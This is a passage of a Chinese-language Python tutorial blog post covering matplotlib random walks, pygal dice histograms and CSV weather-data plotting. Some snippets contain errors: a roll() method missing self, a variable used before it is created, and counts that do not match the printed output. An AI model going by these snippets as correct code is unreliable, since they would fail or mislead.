edgecolors=<span class="string">'none'</span>, s=<span class="number">100</span>)</span><br><span class="line">    plt.scatter(rw.x_values[<span class="number">-1</span>], rw.y_values[<span class="number">-1</span>], c=<span class="string">'red'</span>, edgecolors=<span class="string">'none'</span>,</span><br><span class="line">s=<span class="number">100</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    keep_running = input(<span class="string">"Make another walk? (y/n): "</span>)</span><br><span class="line">    <span class="keyword">if</span> keep_running==<span class="string">'n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/14.png" alt=""><br>Make another walk? (y/n): n</p><p><strong>隐藏坐标轴</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 只要程序处于活动状态，就不断地模拟随机漫步</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">    rw.fill_walk()</span><br><span class="line">    point_numbers = list(range(rw.num_points))</span><br><span class="line">    plt.scatter(rw.x_values[<span class="number">-1</span>], rw.y_values[<span class="number">-1</span>], c=<span class="string">'red'</span>, edgecolors=<span class="string">'none'</span>,</span><br><span class="line">s=<span class="number">100</span>)</span><br><span class="line"><span class="comment"># 隐藏坐标轴</span></span><br><span class="line">    plt.axes().get_xaxis().set_visible(<span class="keyword">False</span>)</span><br><span class="line">    plt.axes().get_yaxis().set_visible(<span class="keyword">False</span>)</span><br><span class="line">    <span class="comment"># 突出起点和终点</span></span><br><span class="line">    plt.scatter(<span class="number">0</span>, <span class="number">0</span>, c=<span class="string">'green'</span>, edgecolors=<span class="string">'none'</span>, s=<span class="number">100</span>)</span><br><span class="line">    plt.scatter(rw.x_values[<span class="number">-1</span>], rw.y_values[<span class="number">-1</span>], c=<span class="string">'red'</span>, edgecolors=<span class="string">'none'</span>,</span><br><span class="line">s=<span class="number">100</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    keep_running = input(<span class="string">"Make another walk? (y/n): "</span>)</span><br><span class="line">    <span class="keyword">if</span> keep_running==<span class="string">'n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/15.png" alt=""><br>Make another walk? (y/n): n</p><p><strong>增加点数</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 只要程序处于活动状态，就不断地模拟随机漫步</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">    rw = RandomWalk(<span class="number">50000</span>)</span><br><span class="line">    rw.fill_walk()</span><br><span class="line">    <span class="comment"># 绘制点并将图形显示出来</span></span><br><span class="line">    point_numbers = list(range(rw.num_points))</span><br><span class="line">    plt.scatter(rw.x_values, rw.y_values, c=point_numbers, cmap=plt.cm.Blues,</span><br><span class="line">edgecolor=<span class="string">'none'</span>, s=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 突出起点和终点</span></span><br><span class="line">    plt.scatter(<span class="number">0</span>, <span class="number">0</span>, c=<span class="string">'green'</span>, edgecolors=<span class="string">'none'</span>, s=<span class="number">100</span>)</span><br><span class="line">    plt.scatter(rw.x_values[<span class="number">-1</span>], rw.y_values[<span class="number">-1</span>], c=<span class="string">'red'</span>, edgecolors=<span class="string">'none'</span>,</span><br><span class="line">s=<span class="number">100</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    keep_running = input(<span class="string">"Make another walk? (y/n): "</span>)</span><br><span class="line">    <span class="keyword">if</span> keep_running==<span class="string">'n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/16.png" alt=""><br>Make another walk? (y/n): n</p><p><strong>调整尺寸以适合屏幕</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">from</span> random_walk <span class="keyword">import</span> RandomWalk</span><br><span class="line"><span class="comment"># 只要程序处于活动状态，就不断地模拟随机漫步</span></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line"><span class="comment"># 创建一个RandomWalk实例，并将其包含的点都绘制出来</span></span><br><span class="line">    rw = RandomWalk()</span><br><span class="line">    rw.fill_walk()</span><br><span class="line">    <span class="comment"># 设置绘图窗口的尺寸</span></span><br><span class="line">    plt.figure(figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">    <span class="comment"># 绘制点并将图形显示出来</span></span><br><span class="line">    point_numbers = list(range(rw.num_points))</span><br><span class="line">    plt.scatter(rw.x_values, rw.y_values, c=point_numbers, cmap=plt.cm.Blues,</span><br><span class="line">edgecolor=<span class="string">'none'</span>, s=<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 突出起点和终点</span></span><br><span class="line">    plt.scatter(<span class="number">0</span>, <span class="number">0</span>, c=<span class="string">'green'</span>, edgecolors=<span class="string">'none'</span>, s=<span class="number">100</span>)</span><br><span class="line">    plt.scatter(rw.x_values[<span class="number">-1</span>], rw.y_values[<span class="number">-1</span>], c=<span class="string">'red'</span>, edgecolors=<span class="string">'none'</span>,</span><br><span class="line">s=<span class="number">100</span>)</span><br><span class="line">    plt.show()</span><br><span class="line">    keep_running = input(<span class="string">"Make another walk? (y/n): "</span>)</span><br><span class="line">    <span class="keyword">if</span> keep_running==<span class="string">'n'</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/17.png" alt=""><br>Make another walk? (y/n): n</p><p>Python假定屏幕分辨率为80像素/英寸，如果上述代码指定的图表尺寸不合适，可根据需要调整其中的数字。如果你知道自己的系统的分辨率，可使用形参dpi 向figure() 传递<br>该分辨率，以有效地利用可用的屏幕空间，如下所示：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br></pre></td></tr></table></figure></p><p><strong>使用Pygal模拟掷骰子</strong></p><p><strong>创建Die的类</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Die</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="string">"""表示一个骰子的类"""</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,num_sides=<span class="number">6</span>)</span>:</span></span><br><span class="line">        <span class="string">"""骰子默认6面"""</span></span><br><span class="line">        self.num_sides=num_sides</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">roll</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="string">"""返回一个位于1和骰子面数之间的随机值"""</span></span><br><span class="line">        <span class="keyword">return</span> randint(<span class="number">1</span>,self.num_sides)</span><br></pre></td></tr></table></figure></p><p><strong>掷骰子</strong><br><strong>分析结果</strong></p><p><strong>绘制直方图</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> die <span class="keyword">import</span> Die</span><br><span class="line"><span class="comment"># 创建一个D6</span></span><br><span class="line">die=Die()</span><br><span class="line"><span class="comment"># 掷几次骰子，并将结果存储在一个列表中</span></span><br><span class="line">results=[]</span><br><span class="line"><span class="keyword">for</span> roll_num <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    result=die.roll()</span><br><span class="line">    results.append(result)    </span><br><span class="line">print(results)</span><br><span class="line"><span class="comment"># 分析结果</span></span><br><span class="line">frequencies = []</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> range(<span class="number">1</span>, die.num_sides+<span class="number">1</span>):</span><br><span class="line">    frequency = results.count(value)</span><br><span class="line">    frequencies.append(frequency)</span><br><span class="line">print(frequencies)</span><br><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line"><span class="comment"># 对结果进行可视化</span></span><br><span class="line">hist = pygal.Bar()</span><br><span class="line">hist.title = <span class="string">"Results of rolling one D6 1000 times."</span></span><br><span class="line">hist.x_labels = [<span class="string">'1'</span>, <span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>]</span><br><span class="line">hist.x_title = <span class="string">"Result"</span></span><br><span class="line">hist.y_title = <span class="string">"Frequency of Result"</span></span><br><span class="line">hist.add(<span class="string">'D6'</span>, frequencies)</span><br><span class="line">hist.render_to_file(<span class="string">'die_visual.svg'</span>)</span><br></pre></td></tr></table></figure></p><p><code>[5, 1, 5, 6, 4, 5, 5, 3, 4, 2, 5, 5, 4, 1, 6, 1, 1, 3, 5, 5, 6, 3, 5, 2, 3, 1, 6, 3, 2, 2, 3, 6, 6, 2, 4, 6, 5, 1, 4, 3, 3, 3, 4, 1, 1, 5, 3, 6, 4, 1, 3, 4, 5, 4, 5, 2, 2, 2, 1, 4, 2, 2, 3, 1, 1, 6, 1, 6, 6, 2, 3, 1, 4, 2, 4, 4, 2, 6, 3, 5, 1, 1, 4, 4, 3, 3, 5, 5, 1, 2, 6, 6, 5, 5, 5, 6, 2, 4, 3, 3]</code></p><p><code>[173, 143, 164, 156, 169, 195]</code><br>将一系列值添加到图表中（向它传递要给添加的值指定的标签，还有一个列表，其中包含将出现在图表中的值）。最后，我们将这个图表渲染为一个SVG文件，这种文件的扩展名必须为.svg。</p><p><img src="/2018/11/26/Python-Learning-3/18.png" alt=""><br>注意，Pygal让这个图表具有交互性：如果你将鼠标指向该图表中的任何条形，将看到与之相关联的数据。在同一个图表中绘制多个数据集时，这项功能显得特别有用。</p><p><strong>同时掷两个骰子</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line"><span class="keyword">from</span> die <span class="keyword">import</span> Die</span><br><span class="line"><span class="comment"># 创建两个D6骰子</span></span><br><span class="line">die_1 = Die()</span><br><span class="line">die_2 = Die()</span><br><span class="line"><span class="comment"># 掷骰子多次，并将结果存储到一个列表中</span></span><br><span class="line">results = []</span><br><span class="line"><span class="keyword">for</span> roll_num <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">    result = die_1.roll() + die_2.roll()</span><br><span class="line">    results.append(result)</span><br><span class="line"><span class="comment"># 分析结果</span></span><br><span class="line">frequencies = []</span><br><span class="line">max_result = die_1.num_sides + die_2.num_sides</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> range(<span class="number">2</span>, max_result+<span class="number">1</span>):</span><br><span class="line">    frequency = results.count(value)</span><br><span class="line">    frequencies.append(frequency)</span><br><span class="line"><span class="comment"># 可视化结果</span></span><br><span class="line">hist = pygal.Bar()</span><br><span class="line">hist.title = <span class="string">"Results of rolling two D6 dice 1000 times."</span></span><br><span class="line">hist.x_labels = [<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>]</span><br><span class="line">hist.x_title = <span class="string">"Result"</span></span><br><span class="line">hist.y_title = <span class="string">"Frequency of Result"</span></span><br><span class="line">hist.add(<span class="string">'D6 + D6'</span>, frequencies)</span><br><span class="line">hist.render_to_file(<span class="string">'dice_visual.svg'</span>)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/Python-Learning-3/19.png" alt=""></p><p><strong>同时掷两个面数不同的骰子</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> die <span class="keyword">import</span> Die</span><br><span class="line"><span class="keyword">import</span> pygal</span><br><span class="line"><span class="comment"># 创建一个D6和一个D10</span></span><br><span class="line">die_1 = Die()</span><br><span class="line">die_2 = Die(<span class="number">10</span>)</span><br><span class="line"><span class="comment"># 掷骰子多次，并将结果存储在一个列表中</span></span><br><span class="line">results = []</span><br><span class="line"><span class="keyword">for</span> roll_num <span class="keyword">in</span> range(<span class="number">50000</span>):</span><br><span class="line">    result = die_1.roll() + die_2.roll()</span><br><span class="line">    results.append(result)</span><br><span class="line"><span class="comment"># 分析结果</span></span><br><span class="line">frequencies = []</span><br><span class="line">max_result = die_1.num_sides + die_2.num_sides</span><br><span class="line"><span class="keyword">for</span> value <span class="keyword">in</span> range(<span class="number">2</span>, max_result+<span class="number">1</span>):</span><br><span class="line">    frequency = results.count(value)</span><br><span class="line">    frequencies.append(frequency)</span><br><span class="line"><span class="comment"># 可视化结果</span></span><br><span class="line">hist = pygal.Bar()</span><br><span class="line">hist.title = <span class="string">"Results of rolling a D6 and a D10 50,000 times."</span></span><br><span class="line">hist.x_labels = [<span class="string">'2'</span>, <span class="string">'3'</span>, <span class="string">'4'</span>, <span class="string">'5'</span>, <span class="string">'6'</span>, <span class="string">'7'</span>, <span class="string">'8'</span>, <span class="string">'9'</span>, <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>,</span><br><span class="line"><span class="string">'13'</span>, <span class="string">'14'</span>, <span class="string">'15'</span>, <span class="string">'16'</span>]</span><br><span class="line">hist.x_title = <span class="string">"Result"</span></span><br><span class="line">hist.y_title = <span class="string">"Frequency of Result"</span></span><br><span class="line">hist.add(<span class="string">'D6 + D10'</span>, frequencies)</span><br><span class="line">hist.render_to_file(<span class="string">'dice_visual2.svg'</span>)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/Python-Learning-3/20.png" alt=""></p><p><strong>CSV文件格式</strong></p><p><strong>分析CSV文件头</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">filename = <span class="string">'sitka_weather_07-2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    print(header_row)</span><br></pre></td></tr></table></figure></p><p><code>[&#39;AKDT&#39;, &#39;Max TemperatureF&#39;, &#39;Mean TemperatureF&#39;, &#39;Min TemperatureF&#39;, &#39;Max Dew PointF&#39;, &#39;MeanDew PointF&#39;, &#39;Min DewpointF&#39;, &#39;Max Humidity&#39;, &#39; Mean Humidity&#39;, &#39; Min Humidity&#39;, &#39; Max Sea Level PressureIn&#39;, &#39; Mean Sea Level PressureIn&#39;, &#39; Min Sea Level PressureIn&#39;, &#39; Max VisibilityMiles&#39;, &#39; Mean VisibilityMiles&#39;, &#39; Min VisibilityMiles&#39;, &#39; Max Wind SpeedMPH&#39;, &#39; Mean Wind SpeedMPH&#39;, &#39; Max Gust SpeedMPH&#39;, &#39;PrecipitationIn&#39;, &#39; CloudCover&#39;, &#39; Events&#39;, &#39; WindDirDegrees&#39;]</code></p><p>导入模块csv 后，我们将要使用的文件的名称存储在filename 中。接下来，我们打开这个文件，并将结果文件对象存储在f 中。然后，我们调用csv.reader() ，并将前面存储的文件对象作为实参传递给它，从而创建一个与该文件相关联的阅读器（reader ）对象。我们将这个阅读器对象存储在reader 中。<br>模块csv 包含函数next() ，调用它并将阅读器对象传递给它时，它将返回文件中的下一行。在前面的代码中，我们只调用了next() 一次，因此得到的是文件的第一行，其中包含文件头。我们将返回的数据存储在header_row 中。正如你看到的，header_row 包含与天气相关的文件头，指出了每行都包含哪些数据：</p><p><strong>打印文件头及其位置</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line">filename = <span class="string">'sitka_weather_07-2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    <span class="keyword">for</span> index, column_header <span class="keyword">in</span> enumerate(header_row):</span><br><span class="line">        print(index, column_header)</span><br></pre></td></tr></table></figure><p><code>0 AKDT</code><br><code>1 Max TemperatureF</code><br><code>2 Mean TemperatureF</code><br><code>3 Min TemperatureF</code><br><code>4 Max Dew PointF</code><br><code>5 MeanDew PointF</code><br><code>6 Min DewpointF</code><br><code>7 Max Humidity</code><br><code>8  Mean Humidity</code><br><code>9  Min Humidity</code><br><code>10  Max Sea Level PressureIn</code><br><code>11  Mean Sea Level PressureIn</code><br><code>12  Min Sea Level PressureIn</code><br><code>13  Max VisibilityMiles</code><br><code>14  Mean VisibilityMiles</code><br><code>15  Min VisibilityMiles</code><br><code>16  Max Wind SpeedMPH</code><br><code>17  Mean Wind SpeedMPH</code><br><code>18  Max Gust SpeedMPH</code><br><code>19 PrecipitationIn</code><br><code>20  CloudCover</code><br><code>21  Events</code><br><code>22  WindDirDegrees</code></p><p><strong>提取并读取数据</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="comment"># 从文件中获取最高气温</span></span><br><span class="line">filename = <span class="string">'sitka_weather_07-2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    highs = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        highs.append(row[<span class="number">1</span>])</span><br><span class="line">    print(highs)</span><br></pre></td></tr></table></figure></p><p><code>[&#39;64&#39;, &#39;71&#39;, &#39;64&#39;, &#39;59&#39;, &#39;69&#39;, &#39;62&#39;, &#39;61&#39;, &#39;55&#39;, &#39;57&#39;, &#39;61&#39;, &#39;57&#39;, &#39;59&#39;, &#39;57&#39;, &#39;61&#39;, &#39;64&#39;, &#39;61&#39;, &#39;59&#39;, &#39;63&#39;, &#39;60&#39;, &#39;57&#39;, &#39;69&#39;, &#39;63&#39;, &#39;62&#39;, &#39;59&#39;, &#39;57&#39;, &#39;57&#39;, &#39;61&#39;, &#39;59&#39;, &#39;61&#39;, &#39;61&#39;, &#39;66&#39;]</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="comment"># 从文件中获取最高气温</span></span><br><span class="line">filename = <span class="string">'sitka_weather_07-2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    highs = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        high=int(row[<span class="number">1</span>])</span><br><span class="line">        highs.append(high)</span><br><span class="line">    print(highs)</span><br></pre></td></tr></table></figure><p><code>[64, 71, 64, 59, 69, 62, 61, 55, 57, 61, 57, 59, 57, 61, 64, 61, 59, 63, 60, 57, 69, 63, 62, 59, 57, 57, 61, 59, 61, 61, 66]</code></p><p><strong>绘制气温图表</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 从文件中获取最高气温</span></span><br><span class="line">filename = <span class="string">'sitka_weather_07-2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    highs = []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        high=int(row[<span class="number">1</span>])</span><br><span class="line">        highs.append(high)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据数据绘制图形</span></span><br><span class="line">fig = plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(highs, c=<span class="string">'red'</span>)</span><br><span class="line"><span class="comment"># 设置图形的格式</span></span><br><span class="line">plt.title(<span class="string">"Daily high temperatures, July 2014"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">''</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.ylabel(<span class="string">"Temperature (F)"</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">16</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/Python-Learning-3/21.png" alt=""></p><p><strong>模块datetime</strong><br>模块datetime中设置日期和时间格式的实参<br>|实参|含义|<br>|—|—|<br>|%A |星期的名称，如Monday|<br>|%B| 月份名，如January|<br>|%m| 用数字表示的月份（01~12）|<br>|%d |用数字表示月份中的一天（01~31）|<br>|%Y |四位的年份，如2015|<br>|%y |两位的年份，如15|<br>|%H |24小时制的小时数（00~23）|<br>|%I |12小时制的小时数（01~12）|<br>|%p |am或pm|<br>|%M |分钟数（00~59）|<br>|%S |秒数（00~61）|</p><p><strong>在图表中添加日期</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 从文件中获取日期和最高气温</span></span><br><span class="line">filename = <span class="string">'sitka_weather_07-2014.csv'</span></span><br><span class="line"><span class="keyword">with</span> open(filename) <span class="keyword">as</span> f:</span><br><span class="line">    reader = csv.reader(f)</span><br><span class="line">    header_row = next(reader)</span><br><span class="line">    dates, highs = [], []</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> reader:</span><br><span class="line">        current_date = datetime.strptime(row[<span class="number">0</span>], <span class="string">"%Y-%m-%d"</span>)</span><br><span class="line">        dates.append(current_date)</span><br><span class="line">        high = int(row[<span class="number">1</span>])</span><br><span class="line">        highs.append(high)</span><br><span class="line">        <span class="comment"># 根据数据绘制图形</span></span><br><span class="line">fig = plt.figure(dpi=<span class="number">128</span>, figsize=(<span class="number">10</span>, <span class="number">6</span>))</span><br><span class="line">plt.plot(dates, highs, c=<span class="string">'red'</span>)</span><br><span class="line">    <span class="comment"># 设置图形的格式</span></span><br><span class="line">plt.title(<span class="string">"Daily high temperatures, July 2014"</span>, fontsize=<span class="number">24</span>)</span><br><span class="line">plt.xlabel(<span class="string">''</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">fig.autofmt_xdate()</span><br><span class="line">plt.ylabel(<span class="string">"Temperature (F)"</span>, fontsize=<span class="number">16</span>)</span><br><span class="line">plt.tick_params(axis=<span class="string">'both'</span>, which=<span class="string">'major'</span>, labelsize=<span class="number">16</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/2018/11/26/Python-Learning-3/22.png" alt=""></p><p><strong>涵盖更长的时间</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment"># 从文件中获取日期和最高气温</span></span><br><span 